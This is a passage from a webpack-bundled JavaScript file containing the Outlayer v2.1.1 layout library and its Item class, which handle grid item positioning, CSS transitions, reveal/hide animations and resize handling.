        } else if ((false ? undefined : _babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0___default()(module)) == 'object' && module.exports) {
          // CommonJS - Browserify, Webpack
          module.exports = factory(__webpack_require__(/*! ev-emitter */"./node_modules/ev-emitter/ev-emitter.js"), __webpack_require__(/*! get-size */"./node_modules/get-size/get-size.js"));
        } else {
          // browser global
          window.Outlayer = {};
          window.Outlayer.Item = factory(window.EvEmitter, window.getSize);
        }
      })(window, function factory(EvEmitter, getSize) {
        'use strict';

        // ----- helpers ----- //
        function isEmptyObj(obj) {
          for (var prop in obj) {
            return false;
          }
          prop = null;
          return true;
        }

        // -------------------------- CSS3 support -------------------------- //

        var docElemStyle = document.documentElement.style;
        var transitionProperty = typeof docElemStyle.transition == 'string' ? 'transition' : 'WebkitTransition';
        var transformProperty = typeof docElemStyle.transform == 'string' ? 'transform' : 'WebkitTransform';
        var transitionEndEvent = {
          WebkitTransition: 'webkitTransitionEnd',
          transition: 'transitionend'
        }[transitionProperty];

        // cache all vendor properties that could have vendor prefix
        var vendorProperties = {
          transform: transformProperty,
          transition: transitionProperty,
          transitionDuration: transitionProperty + 'Duration',
          transitionProperty: transitionProperty + 'Property',
          transitionDelay: transitionProperty + 'Delay'
        };

        // -------------------------- Item -------------------------- //

        function Item(element, layout) {
          if (!element) {
            return;
          }
          this.element = element;
          // parent layout class, i.e. Masonry, Isotope, or Packery
          this.layout = layout;
          this.position = {
            x: 0,
            y: 0
          };
          this._create();
        }

        // inherit EvEmitter
        var proto = Item.prototype = Object.create(EvEmitter.prototype);
        proto.constructor = Item;
        proto._create = function () {
          // transition objects
          this._transn = {
            ingProperties: {},
            clean: {},
            onEnd: {}
          };
          this.css({
            position: 'absolute'
          });
        };

        // trigger specified handler for event type
        proto.handleEvent = function (event) {
          var method = 'on' + event.type;
          if (this[method]) {
            this[method](event);
          }
        };
        proto.getSize = function () {
          this.size = getSize(this.element);
        };

        /**
         * apply CSS styles to element
         * @param {Object} style
         */
        proto.css = function (style) {
          var elemStyle = this.element.style;
          for (var prop in style) {
            // use vendor property if available
            var supportedProp = vendorProperties[prop] || prop;
            elemStyle[supportedProp] = style[prop];
          }
        };

        // measure position, and sets it
        proto.getPosition = function () {
          var style = getComputedStyle(this.element);
          var isOriginLeft = this.layout._getOption('originLeft');
          var isOriginTop = this.layout._getOption('originTop');
          var xValue = style[isOriginLeft ? 'left' : 'right'];
          var yValue = style[isOriginTop ? 'top' : 'bottom'];
          var x = parseFloat(xValue);
          var y = parseFloat(yValue);
          // convert percent to pixels
          var layoutSize = this.layout.size;
          if (xValue.indexOf('%') != -1) {
            x = x / 100 * layoutSize.width;
          }
          if (yValue.indexOf('%') != -1) {
            y = y / 100 * layoutSize.height;
          }
          // clean up 'auto' or other non-integer values
          x = isNaN(x) ? 0 : x;
          y = isNaN(y) ? 0 : y;
          // remove padding from measurement
          x -= isOriginLeft ? layoutSize.paddingLeft : layoutSize.paddingRight;
          y -= isOriginTop ? layoutSize.paddingTop : layoutSize.paddingBottom;
          this.position.x = x;
          this.position.y = y;
        };

        // set settled position, apply padding
        proto.layoutPosition = function () {
          var layoutSize = this.layout.size;
          var style = {};
          var isOriginLeft = this.layout._getOption('originLeft');
          var isOriginTop = this.layout._getOption('originTop');

          // x
          var xPadding = isOriginLeft ? 'paddingLeft' : 'paddingRight';
          var xProperty = isOriginLeft ? 'left' : 'right';
          var xResetProperty = isOriginLeft ? 'right' : 'left';
          var x = this.position.x + layoutSize[xPadding];
          // set in percentage or pixels
          style[xProperty] = this.getXValue(x);
          // reset other property
          style[xResetProperty] = '';

          // y
          var yPadding = isOriginTop ? 'paddingTop' : 'paddingBottom';
          var yProperty = isOriginTop ? 'top' : 'bottom';
          var yResetProperty = isOriginTop ? 'bottom' : 'top';
          var y = this.position.y + layoutSize[yPadding];
          // set in percentage or pixels
          style[yProperty] = this.getYValue(y);
          // reset other property
          style[yResetProperty] = '';
          this.css(style);
          this.emitEvent('layout', [this]);
        };
        proto.getXValue = function (x) {
          var isHorizontal = this.layout._getOption('horizontal');
          return this.layout.options.percentPosition && !isHorizontal ? x / this.layout.size.width * 100 + '%' : x + 'px';
        };
        proto.getYValue = function (y) {
          var isHorizontal = this.layout._getOption('horizontal');
          return this.layout.options.percentPosition && isHorizontal ? y / this.layout.size.height * 100 + '%' : y + 'px';
        };
        proto._transitionTo = function (x, y) {
          this.getPosition();
          // get current x & y from top/left
          var curX = this.position.x;
          var curY = this.position.y;
          var didNotMove = x == this.position.x && y == this.position.y;

          // save end position
          this.setPosition(x, y);

          // if did not move and not transitioning, just go to layout
          if (didNotMove && !this.isTransitioning) {
            this.layoutPosition();
            return;
          }
          var transX = x - curX;
          var transY = y - curY;
          var transitionStyle = {};
          transitionStyle.transform = this.getTranslate(transX, transY);
          this.transition({
            to: transitionStyle,
            onTransitionEnd: {
              transform: this.layoutPosition
            },
            isCleaning: true
          });
        };
        proto.getTranslate = function (x, y) {
          // flip cooridinates if origin on right or bottom
          var isOriginLeft = this.layout._getOption('originLeft');
          var isOriginTop = this.layout._getOption('originTop');
          x = isOriginLeft ? x : -x;
          y = isOriginTop ? y : -y;
          return 'translate3d(' + x + 'px, ' + y + 'px, 0)';
        };

        // non transition + transform support
        proto.goTo = function (x, y) {
          this.setPosition(x, y);
          this.layoutPosition();
        };
        proto.moveTo = proto._transitionTo;
        proto.setPosition = function (x, y) {
          this.position.x = parseFloat(x);
          this.position.y = parseFloat(y);
        };

        // ----- transition ----- //

        /**
         * @param {Object} style - CSS
         * @param {Function} onTransitionEnd
         */

        // non transition, just trigger callback
        proto._nonTransition = function (args) {
          this.css(args.to);
          if (args.isCleaning) {
            this._removeStyles(args.to);
          }
          for (var prop in args.onTransitionEnd) {
            args.onTransitionEnd[prop].call(this);
          }
        };

        /**
         * proper transition
         * @param {Object} args - arguments
         *   @param {Object} to - style to transition to
         *   @param {Object} from - style to start transition from
         *   @param {Boolean} isCleaning - removes transition styles after transition
         *   @param {Function} onTransitionEnd - callback
         */
        proto.transition = function (args) {
          // redirect to nonTransition if no transition duration
          if (!parseFloat(this.layout.options.transitionDuration)) {
            this._nonTransition(args);
            return;
          }
          var _transition = this._transn;
          // keep track of onTransitionEnd callback by css property
          for (var prop in args.onTransitionEnd) {
            _transition.onEnd[prop] = args.onTransitionEnd[prop];
          }
          // keep track of properties that are transitioning
          for (prop in args.to) {
            _transition.ingProperties[prop] = true;
            // keep track of properties to clean up when transition is done
            if (args.isCleaning) {
              _transition.clean[prop] = true;
            }
          }

          // set from styles
          if (args.from) {
            this.css(args.from);
            // force redraw. http://blog.alexmaccaw.com/css-transitions
            var h = this.element.offsetHeight;
            // hack for JSHint to hush about unused var
            h = null;
          }
          // enable transition
          this.enableTransition(args.to);
          // set styles that are transitioning
          this.css(args.to);
          this.isTransitioning = true;
        };

        // dash before all cap letters, including first for
        // WebkitTransform => -webkit-transform
        function toDashedAll(str) {
          return str.replace(/([A-Z])/g, function ($1) {
            return '-' + $1.toLowerCase();
          });
        }
        var transitionProps = 'opacity,' + toDashedAll(transformProperty);
        proto.enableTransition = function /* style */
        () {
          // HACK changing transitionProperty during a transition
          // will cause transition to jump
          if (this.isTransitioning) {
            return;
          }

          // make `transition: foo, bar, baz` from style object
          // HACK un-comment this when enableTransition can work
          // while a transition is happening
          // var transitionValues = [];
          // for ( var prop in style ) {
          //   // dash-ify camelCased properties like WebkitTransition
          //   prop = vendorProperties[ prop ] || prop;
          //   transitionValues.push( toDashedAll( prop ) );
          // }
          // munge number to millisecond, to match stagger
          var duration = this.layout.options.transitionDuration;
          duration = typeof duration == 'number' ? duration + 'ms' : duration;
          // enable transition styles
          this.css({
            transitionProperty: transitionProps,
            transitionDuration: duration,
            transitionDelay: this.staggerDelay || 0
          });
          // listen for transition end event
          this.element.addEventListener(transitionEndEvent, this, false);
        };

        // ----- events ----- //

        proto.onwebkitTransitionEnd = function (event) {
          this.ontransitionend(event);
        };
        proto.onotransitionend = function (event) {
          this.ontransitionend(event);
        };

        // properties that I munge to make my life easier
        var dashedVendorProperties = {
          '-webkit-transform': 'transform'
        };
        proto.ontransitionend = function (event) {
          // disregard bubbled events from children
          if (event.target !== this.element) {
            return;
          }
          var _transition = this._transn;
          // get property name of transitioned property, convert to prefix-free
          var propertyName = dashedVendorProperties[event.propertyName] || event.propertyName;

          // remove property that has completed transitioning
          delete _transition.ingProperties[propertyName];
          // check if any properties are still transitioning
          if (isEmptyObj(_transition.ingProperties)) {
            // all properties have completed transitioning
            this.disableTransition();
          }
          // clean style
          if (propertyName in _transition.clean) {
            // clean up style
            this.element.style[event.propertyName] = '';
            delete _transition.clean[propertyName];
          }
          // trigger onTransitionEnd callback
          if (propertyName in _transition.onEnd) {
            var onTransitionEnd = _transition.onEnd[propertyName];
            onTransitionEnd.call(this);
            delete _transition.onEnd[propertyName];
          }
          this.emitEvent('transitionEnd', [this]);
        };
        proto.disableTransition = function () {
          this.removeTransitionStyles();
          this.element.removeEventListener(transitionEndEvent, this, false);
          this.isTransitioning = false;
        };

        /**
         * removes style property from element
         * @param {Object} style
        **/
        proto._removeStyles = function (style) {
          // clean up transition styles
          var cleanStyle = {};
          for (var prop in style) {
            cleanStyle[prop] = '';
          }
          this.css(cleanStyle);
        };
        var cleanTransitionStyle = {
          transitionProperty: '',
          transitionDuration: '',
          transitionDelay: ''
        };
        proto.removeTransitionStyles = function () {
          // remove transition
          this.css(cleanTransitionStyle);
        };

        // ----- stagger ----- //

        proto.stagger = function (delay) {
          delay = isNaN(delay) ? 0 : delay;
          this.staggerDelay = delay + 'ms';
        };

        // ----- show/hide/remove ----- //

        // remove element from DOM
        proto.removeElem = function () {
          this.element.parentNode.removeChild(this.element);
          // remove display: none
          this.css({
            display: ''
          });
          this.emitEvent('remove', [this]);
        };
        proto.remove = function () {
          // just remove element if no transition support or no transition
          if (!transitionProperty || !parseFloat(this.layout.options.transitionDuration)) {
            this.removeElem();
            return;
          }

          // start transition
          this.once('transitionEnd', function () {
            this.removeElem();
          });
          this.hide();
        };
        proto.reveal = function () {
          delete this.isHidden;
          // remove display: none
          this.css({
            display: ''
          });
          var options = this.layout.options;
          var onTransitionEnd = {};
          var transitionEndProperty = this.getHideRevealTransitionEndProperty('visibleStyle');
          onTransitionEnd[transitionEndProperty] = this.onRevealTransitionEnd;
          this.transition({
            from: options.hiddenStyle,
            to: options.visibleStyle,
            isCleaning: true,
            onTransitionEnd: onTransitionEnd
          });
        };
        proto.onRevealTransitionEnd = function () {
          // check if still visible
          // during transition, item may have been hidden
          if (!this.isHidden) {
            this.emitEvent('reveal');
          }
        };

        /**
         * get style property use for hide/reveal transition end
         * @param {String} styleProperty - hiddenStyle/visibleStyle
         * @returns {String}
         */
        proto.getHideRevealTransitionEndProperty = function (styleProperty) {
          var optionStyle = this.layout.options[styleProperty];
          // use opacity
          if (optionStyle.opacity) {
            return 'opacity';
          }
          // get first property
          for (var prop in optionStyle) {
            return prop;
          }
        };
        proto.hide = function () {
          // set flag
          this.isHidden = true;
          // remove display: none
          this.css({
            display: ''
          });
          var options = this.layout.options;
          var onTransitionEnd = {};
          var transitionEndProperty = this.getHideRevealTransitionEndProperty('hiddenStyle');
          onTransitionEnd[transitionEndProperty] = this.onHideTransitionEnd;
          this.transition({
            from: options.visibleStyle,
            to: options.hiddenStyle,
            // keep hidden stuff hidden
            isCleaning: true,
            onTransitionEnd: onTransitionEnd
          });
        };
        proto.onHideTransitionEnd = function () {
          // check if still hidden
          // during transition, item may have been un-hidden
          if (this.isHidden) {
            this.css({
              display: 'none'
            });
            this.emitEvent('hide');
          }
        };
        proto.destroy = function () {
          this.css({
            position: '',
            left: '',
            right: '',
            top: '',
            bottom: '',
            transition: '',
            transform: ''
          });
        };
        return Item;
      });

      /*!
       * Outlayer v2.1.1
       * the brains and guts of a layout library
       * MIT license
       */

      (function (window, factory) {
        'use strict';

        // universal module definition
        /* jshint strict: false */ /* globals define, module, require */
        if (typeof define == 'function' && __webpack_require__(/*! !webpack amd options */"./node_modules/webpack/buildin/amd-options.js")) {
          // AMD - RequireJS
          define('outlayer/outlayer', ['ev-emitter/ev-emitter', 'get-size/get-size', 'fizzy-ui-utils/utils'
          // './item'
          ], function (EvEmitter, getSize, utils, Item) {
            return factory(window, EvEmitter, getSize, utils, Item);
          });
        } else if ((false ? undefined : _babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0___default()(module)) == 'object' && module.exports) {
          // CommonJS - Browserify, Webpack
          module.exports = factory(window, __webpack_require__(/*! ev-emitter */"./node_modules/ev-emitter/ev-emitter.js"), __webpack_require__(/*! get-size */"./node_modules/get-size/get-size.js"), __webpack_require__(/*! fizzy-ui-utils */"./node_modules/fizzy-ui-utils/utils.js")
          // require('./item')
          );
        } else {
          // browser global
          window.Outlayer = factory(window, window.EvEmitter, window.getSize, window.fizzyUIUtils, window.Outlayer.Item);
        }
      })(window, function factory(window, EvEmitter, getSize, utils, Item) {
        'use strict';

        // ----- vars ----- //
        var console = window.console;
        var jQuery = window.jQuery;
        var noop = function noop() {};

        // -------------------------- Outlayer -------------------------- //

        // globally unique identifiers
        var GUID = 0;
        // internal store of all Outlayer intances
        var instances = {};

        /**
         * @param {Element, String} element
         * @param {Object} options
         * @constructor
         */
        function Outlayer(element, options) {
          var queryElement = utils.getQueryElement(element);
          if (!queryElement) {
            if (console) {
              console.error('Bad element for ' + this.constructor.namespace + ': ' + (queryElement || element));
            }
            return;
          }
          this.element = queryElement;
          // add jQuery
          if (jQuery) {
            this.$element = jQuery(this.element);
          }

          // options
          this.options = utils.extend({}, this.constructor.defaults);
          this.option(options);

          // add id for Outlayer.getFromElement
          var id = ++GUID;
          this.element.outlayerGUID = id; // expando
          instances[id] = this; // associate via id

          // kick it off
          this._create();
          var isInitLayout = this._getOption('initLayout');
          if (isInitLayout) {
            this.layout();
          }
        }

        // settings are for internal use only
        Outlayer.namespace = 'outlayer';
        Outlayer.Item = Item;

        // default options
        Outlayer.defaults = {
          containerStyle: {
            position: 'relative'
          },
          initLayout: true,
          originLeft: true,
          originTop: true,
          resize: true,
          resizeContainer: true,
          // item options
          transitionDuration: '0.4s',
          hiddenStyle: {
            opacity: 0,
            transform: 'scale(0.001)'
          },
          visibleStyle: {
            opacity: 1,
            transform: 'scale(1)'
          }
        };
        var proto = Outlayer.prototype;
        // inherit EvEmitter
        utils.extend(proto, EvEmitter.prototype);

        /**
         * set options
         * @param {Object} opts
         */
        proto.option = function (opts) {
          utils.extend(this.options, opts);
        };

        /**
         * get backwards compatible option value, check old name
         */
        proto._getOption = function (option) {
          var oldOption = this.constructor.compatOptions[option];
          return oldOption && this.options[oldOption] !== undefined ? this.options[oldOption] : this.options[option];
        };
        Outlayer.compatOptions = {
          // currentName: oldName
          initLayout: 'isInitLayout',
          horizontal: 'isHorizontal',
          layoutInstant: 'isLayoutInstant',
          originLeft: 'isOriginLeft',
          originTop: 'isOriginTop',
          resize: 'isResizeBound',
          resizeContainer: 'isResizingContainer'
        };
        proto._create = function () {
          // get items from children
          this.reloadItems();
          // elements that affect layout, but are not laid out
          this.stamps = [];
          this.stamp(this.options.stamp);
          // set container style
          utils.extend(this.element.style, this.options.containerStyle);

          // bind resize method
          var canBindResize = this._getOption('resize');
          if (canBindResize) {
            this.bindResize();
          }
        };

        // goes through all children again and gets bricks in proper order
        proto.reloadItems = function () {
          // collection of item elements
          this.items = this._itemize(this.element.children);
        };

        /**
         * turn elements into Outlayer.Items to be used in layout
         * @param {Array or NodeList or HTMLElement} elems
         * @returns {Array} items - collection of new Outlayer Items
         */
        proto._itemize = function (elems) {
          var itemElems = this._filterFindItemElements(elems);
          var Item = this.constructor.Item;

          // create new Outlayer Items for collection
          var items = [];
          for (var i = 0; i < itemElems.length; i++) {
            var elem = itemElems[i];
            var item = new Item(elem, this);
            items.push(item);
          }
          return items;
        };

        /**
         * get item elements to be used in layout
         * @param {Array or NodeList or HTMLElement} elems
         * @returns {Array} items - item elements
         */
        proto._filterFindItemElements = function (elems) {
          return utils.filterFindElements(elems, this.options.itemSelector);
        };

        /**
         * getter method for getting item elements
         * @returns {Array} elems - collection of item elements
         */
        proto.getItemElements = function () {
          return this.items.map(function (item) {
            return item.element;
          });
        };

        // ----- init & layout ----- //

        /**
         * lays out all items
         */
        proto.layout = function () {
          this._resetLayout();
          this._manageStamps();

          // don't animate first layout
          var layoutInstant = this._getOption('layoutInstant');
          var isInstant = layoutInstant !== undefined ? layoutInstant : !this._isLayoutInited;
          this.layoutItems(this.items, isInstant);

          // flag for initalized
          this._isLayoutInited = true;
        };

        // _init is alias for layout
        proto._init = proto.layout;

        /**
         * logic before any new layout
         */
        proto._resetLayout = function () {
          this.getSize();
        };
        proto.getSize = function () {
          this.size = getSize(this.element);
        };

        /**
         * get measurement from option, for columnWidth, rowHeight, gutter
         * if option is String -> get element from selector string, & get size of element
         * if option is Element -> get size of element
         * else use option as a number
         *
         * @param {String} measurement
         * @param {String} size - width or height
         * @private
         */
        proto._getMeasurement = function (measurement, size) {
          var option = this.options[measurement];
          var elem;
          if (!option) {
            // default to 0
            this[measurement] = 0;
          } else {
            // use option as an element
            if (typeof option == 'string') {
              elem = this.element.querySelector(option);
            } else if (option instanceof HTMLElement) {
              elem = option;
            }
            // use size of element, if element
            this[measurement] = elem ? getSize(elem)[size] : option;
          }
        };

        /**
         * layout a collection of item elements
         * @api public
         */
        proto.layoutItems = function (items, isInstant) {
          items = this._getItemsForLayout(items);
          this._layoutItems(items, isInstant);
          this._postLayout();
        };

        /**
         * get the items to be laid out
         * you may want to skip over some items
         * @param {Array} items
         * @returns {Array} items
         */
        proto._getItemsForLayout = function (items) {
          return items.filter(function (item) {
            return !item.isIgnored;
          });
        };

        /**
         * layout items
         * @param {Array} items
         * @param {Boolean} isInstant
         */
        proto._layoutItems = function (items, isInstant) {
          this._emitCompleteOnItems('layout', items);
          if (!items || !items.length) {
            // no items, emit event with empty array
            return;
          }
          var queue = [];
          items.forEach(function (item) {
            // get x/y object from method
            var position = this._getItemLayoutPosition(item);
            // enqueue
            position.item = item;
            position.isInstant = isInstant || item.isLayoutInstant;
            queue.push(position);
          }, this);
          this._processLayoutQueue(queue);
        };

        /**
         * get item layout position
         * @param {Outlayer.Item} item
         * @returns {Object} x and y position
         */
        proto._getItemLayoutPosition = function /* item */
        () {
          return {
            x: 0,
            y: 0
          };
        };

        /**
         * iterate over array and position each item
         * Reason being - separating this logic prevents 'layout invalidation'
         * thx @paul_irish
         * @param {Array} queue
         */
        proto._processLayoutQueue = function (queue) {
          this.updateStagger();
          queue.forEach(function (obj, i) {
            this._positionItem(obj.item, obj.x, obj.y, obj.isInstant, i);
          }, this);
        };

        // set stagger from option in milliseconds number
        proto.updateStagger = function () {
          var stagger = this.options.stagger;
          if (stagger === null || stagger === undefined) {
            this.stagger = 0;
            return;
          }
          this.stagger = getMilliseconds(stagger);
          return this.stagger;
        };

        /**
         * Sets position of item in DOM
         * @param {Outlayer.Item} item
         * @param {Number} x - horizontal position
         * @param {Number} y - vertical position
         * @param {Boolean} isInstant - disables transitions
         */
        proto._positionItem = function (item, x, y, isInstant, i) {
          if (isInstant) {
            // if not transition, just set CSS
            item.goTo(x, y);
          } else {
            item.stagger(i * this.stagger);
            item.moveTo(x, y);
          }
        };

        /**
         * Any logic you want to do after each layout,
         * i.e. size the container
         */
        proto._postLayout = function () {
          this.resizeContainer();
        };
        proto.resizeContainer = function () {
          var isResizingContainer = this._getOption('resizeContainer');
          if (!isResizingContainer) {
            return;
          }
          var size = this._getContainerSize();
          if (size) {
            this._setContainerMeasure(size.width, true);
            this._setContainerMeasure(size.height, false);
          }
        };

        /**
         * Sets width or height of container if returned
         * @returns {Object} size
         *   @param {Number} width
         *   @param {Number} height
         */
        proto._getContainerSize = noop;

        /**
         * @param {Number} measure - size of width or height
         * @param {Boolean} isWidth
         */
        proto._setContainerMeasure = function (measure, isWidth) {
          if (measure === undefined) {
            return;
          }
          var elemSize = this.size;
          // add padding and border width if border box
          if (elemSize.isBorderBox) {
            measure += isWidth ? elemSize.paddingLeft + elemSize.paddingRight + elemSize.borderLeftWidth + elemSize.borderRightWidth : elemSize.paddingBottom + elemSize.paddingTop + elemSize.borderTopWidth + elemSize.borderBottomWidth;
          }
          measure = Math.max(measure, 0);
          this.element.style[isWidth ? 'width' : 'height'] = measure + 'px';
        };

        /**
         * emit eventComplete on a collection of items events
         * @param {String} eventName
         * @param {Array} items - Outlayer.Items
         */
        proto._emitCompleteOnItems = function (eventName, items) {
          var _this = this;
          function onComplete() {
            _this.dispatchEvent(eventName + 'Complete', null, [items]);
          }
          var count = items.length;
          if (!items || !count) {
            onComplete();
            return;
          }
          var doneCount = 0;
          function tick() {
            doneCount++;
            if (doneCount == count) {
              onComplete();
            }
          }

          // bind callback
          items.forEach(function (item) {
            item.once(eventName, tick);
          });
        };

        /**
         * emits events via EvEmitter and jQuery events
         * @param {String} type - name of event
         * @param {Event} event - original event
         * @param {Array} args - extra arguments
         */
        proto.dispatchEvent = function (type, event, args) {
          // add original event to arguments
          var emitArgs = event ? [event].concat(args) : args;
          this.emitEvent(type, emitArgs);
          if (jQuery) {
            // set this.$element
            this.$element = this.$element || jQuery(this.element);
            if (event) {
              // create jQuery event
              var $event = jQuery.Event(event);
              $event.type = type;
              this.$element.trigger($event, args);
            } else {
              // just trigger with type if no event available
              this.$element.trigger(type, args);
            }
          }
        };

        // -------------------------- ignore & stamps -------------------------- //

        /**
         * keep item in collection, but do not lay it out
         * ignored items do not get skipped in layout
         * @param {Element} elem
         */
        proto.ignore = function (elem) {
          var item = this.getItem(elem);
          if (item) {
            item.isIgnored = true;
          }
        };

        /**
         * return item to layout collection
         * @param {Element} elem
         */
        proto.unignore = function (elem) {
          var item = this.getItem(elem);
          if (item) {
            delete item.isIgnored;
          }
        };

        /**
         * adds elements to stamps
         * @param {NodeList, Array, Element, or String} elems
         */
        proto.stamp = function (elems) {
          elems = this._find(elems);
          if (!elems) {
            return;
          }
          this.stamps = this.stamps.concat(elems);
          // ignore
          elems.forEach(this.ignore, this);
        };

        /**
         * removes elements to stamps
         * @param {NodeList, Array, or Element} elems
         */
        proto.unstamp = function (elems) {
          elems = this._find(elems);
          if (!elems) {
            return;
          }
          elems.forEach(function (elem) {
            // filter out removed stamp elements
            utils.removeFrom(this.stamps, elem);
            this.unignore(elem);
          }, this);
        };

        /**
         * finds child elements
         * @param {NodeList, Array, Element, or String} elems
         * @returns {Array} elems
         */
        proto._find = function (elems) {
          if (!elems) {
            return;
          }
          // if string, use argument as selector string
          if (typeof elems == 'string') {
            elems = this.element.querySelectorAll(elems);
          }
          elems = utils.makeArray(elems);
          return elems;
        };
        proto._manageStamps = function () {
          if (!this.stamps || !this.stamps.length) {
            return;
          }
          this._getBoundingRect();
          this.stamps.forEach(this._manageStamp, this);
        };

        // update boundingLeft / Top
        proto._getBoundingRect = function () {
          // get bounding rect for container element
          var boundingRect = this.element.getBoundingClientRect();
          var size = this.size;
          this._boundingRect = {
            left: boundingRect.left + size.paddingLeft + size.borderLeftWidth,
            top: boundingRect.top + size.paddingTop + size.borderTopWidth,
            right: boundingRect.right - (size.paddingRight + size.borderRightWidth),
            bottom: boundingRect.bottom - (size.paddingBottom + size.borderBottomWidth)
          };
        };

        /**
         * @param {Element} stamp
        **/
        proto._manageStamp = noop;

        /**
         * get x/y position of element relative to container element
         * @param {Element} elem
         * @returns {Object} offset - has left, top, right, bottom
         */
        proto._getElementOffset = function (elem) {
          var boundingRect = elem.getBoundingClientRect();
          var thisRect = this._boundingRect;
          var size = getSize(elem);
          var offset = {
            left: boundingRect.left - thisRect.left - size.marginLeft,
            top: boundingRect.top - thisRect.top - size.marginTop,
            right: thisRect.right - boundingRect.right - size.marginRight,
            bottom: thisRect.bottom - boundingRect.bottom - size.marginBottom
          };
          return offset;
        };

        // -------------------------- resize -------------------------- //

        // enable event handlers for listeners
        // i.e. resize -> onresize
        proto.handleEvent = utils.handleEvent;

        /**
         * Bind layout to window resizing
         */
        proto.bindResize = function () {
          window.addEventListener('resize', this);
          this.isResizeBound = true;
        };

        /**
         * Unbind layout to window resizing
         */
        proto.unbindResize = function () {
          window.removeEventListener('resize', this);
          this.isResizeBound = false;
        };
        proto.onresize = function () {
          this.resize();
        };
        utils.debounceMethod(Outlayer, 'onresize', 100);
        proto.resize = function () {
          // don't trigger if size did not change
          // or if resize was unbound. See #9
          if (!this.isResizeBound || !this.needsResizeLayout()) {
            return;
          }
          this.layout();
        };

        /**
         * check if layout is needed post layout
         * @returns Boolean
         */
        proto.needsResizeLayout = function () {
          var size = getSize(this.element);
          // check that this.size and size are there
          // IE8 triggers resize on body size change, so they might not be
          var hasSizes = this.size && size;
          return hasSizes && size.innerWidth !== this.size.innerWidth;
        };

        // -------------------------- methods -------------------------- //

        /**
         * add items to Outlayer instance
         * @param {Array or NodeList or Element} elems
         * @returns {Array} items - Outlayer.Items
        **/
        proto.addItems = function (elems) {
          var items = this._itemize(elems);
          // add items to collection
          if (items.length) {
            this.items = this.items.concat(items);
          }
          return items;
        };

        /**
         * Layout newly-appended item elements
         * @param {Array or NodeList or Element} elems
         */
        proto.appended = function (elems) {
          var items = this.addItems(elems);
          if (!items.length) {
            return;
          }
          // layout and reveal just the new items
          this.layoutItems(items, true);
          this.reveal(items);
        };

        /**
         * Layout prepended elements
         * @param {Array or NodeList or Element} elems
         */
        proto.prepended = function (elems) {
          var items = this._itemize(elems);
          if (!items.length) {
            return;
          }
          // add items to beginning of collection
          var previousItems = this.items.slice(0);
          this.items = items.concat(previousItems);
          // start new layout
          this._resetLayout();
          this._manageStamps();
          // layout new stuff without transition
          this.layoutItems(items, true);
          this.reveal(items);
          // layout previous items
          this.layoutItems(previousItems);
        };

        /**
         * reveal a collection of items
         * @param {Array of Outlayer.Items} items
         */
        proto.reveal = function (items) {
          this._emitCompleteOnItems('reveal', items);
          if (!items || !items.length) {
            return;
          }
          var stagger = this.updateStagger();
          items.forEach(function (item, i) {
            item.stagger(i * stagger);
            item.reveal();
          });
        };

        /**
         * hide a collection of items
         * @param {Array of Outlayer.Items} items
         */
        proto.hide = function (items) {
          this._emitCompleteOnItems('hide', items);
          if (!items || !items.length) {
            return;
          }
          var stagger = this.updateStagger();
          items.forEach(function (item, i) {
            item.stagger(i * stagger);
            item.hide();
          });
        };

        /**
         * reveal item elements
         * @param {Array}, {Element}, {NodeList} items
         */
        proto.revealItemElements = function (elems) {
          var items = this.getItems(elems);
          this.reveal(items);
        };

        /**
         * hide item elements
         * @param {Array}, {Element}, {NodeList} items
         */
        proto.hideItemElements = function (elems) {
          var items = this.getItems(elems);
          this.hide(items);
        };

        /**
         * get Outlayer.Item, given an Element
         * @param {Element} elem
         * @param {Function} callback
         * @returns {Outlayer.Item} item
         */
        proto.getItem = function (elem) {
          // loop through items to get the one that matches
          for (var i = 0; i < this.items.length; i++) {
            var item = this.items[i];
            if (item.element == elem) {
              // return item
              return item;
            }
          }
        };

        /**
         * get collection of Outlayer.Items, given Elements
         * @param {Array} elems
         * @returns {Array} items - Outlayer.Items
         */
        proto.getItems = function (elems) {
          elems = utils.makeArray(elems);
          var items = [];
          elems.forEach(function (elem) {
            var item = this.getItem(elem);
            if (item) {
              items.push(item);
            }
          }, this);
          return items;
        };

        /**
         * remove element(s) from instance and DOM
         * @param {Array or NodeList or Element} elems
         */
        proto.remove = function (elems) {
          var removeItems = this.getItems(elems);
          this._emitCompleteOnItems('remove', removeItems);

          // bail if no items to remove
          if (!removeItems || !removeItems.length) {
            return;
          }
          removeItems.forEach(function (item) {
            item.remove();
            // remove item from collection
            utils.removeFrom(this.items, item);
          }, this);
        };

        // ----- destroy ----- //

        // remove and disable Outlayer instance
        proto.destroy = function () {
          // clean up dynamic styles
          var style = this.element.style;
          style.height = '';
          style.position = '';
          style.width = '';
          // destroy items
          this.items.forEach(function (item) {
            item.destroy();
          });
          this.unbindResize();
          var id = this.element.outlayerGUID;
          delete instances[id]; // remove reference to instance by id
          delete this.element.outlayerGUID;
          // remove data for jQuery
          if (jQuery) {
            jQuery.removeData(this.element, this.constructor.namespace);
          }
        };

        // -------------------------- data -------------------------- //

        /**
         * get Outlayer instance from element
         * @param {Element} elem
         * @returns {Outlayer}
         */
        Outlayer.data = function (elem) {
          elem = utils.getQueryElement(elem);
          var id = elem && elem.outlayerGUID;
          return id && instances[id];
        };

        // -------------------------- create Outlayer class -------------------------- //

        /**
         * create a layout class
         * @param {String} namespace
         */
        Outlayer.create = function (namespace, options) {
          // sub-class Outlayer
          var Layout = subclass(Outlayer);
          // apply new options and compatOptions
          Layout.defaults = utils.extend({}, Outlayer.defaults);
          utils.extend(Layout.defaults, options);
          Layout.compatOptions = utils.extend({}, Outlayer.compatOptions);
          Layout.namespace = namespace;
          Layout.data = Outlayer.data;

          // sub-class Item
          Layout.Item = subclass(Item);

          // -------------------------- declarative -------------------------- //

          utils.htmlInit(Layout, namespace);

          // -------------------------- jQuery bridge -------------------------- //

          // make into jQuery plugin
          if (jQuery && jQuery.bridget) {
            jQuery.bridget(namespace, Layout);
          }
          return Layout;
        };
        function subclass(Parent) {
          function SubClass() {
            Parent.apply(this, arguments);
          }
          SubClass.prototype = Object.create(Parent.prototype);
          SubClass.prototype.constructor = SubClass;
          return SubClass;
        }

        // ----- helpers ----- //

        // how many milliseconds are in each unit
        var msUnits = {
          ms: 1,
          s: 1000
        };

        // munge time-like parameter into millisecond number
        // '0.4s' -> 40
        function getMilliseconds(time) {
          if (typeof time == 'number') {
            return time;
          }
          var matches = time.match(/(^\d*\.?\d*)(\w*)/);
          var num = matches && matches[1];
          var unit = matches && matches[2];
          if (!num.length) {
            return 0;
          }
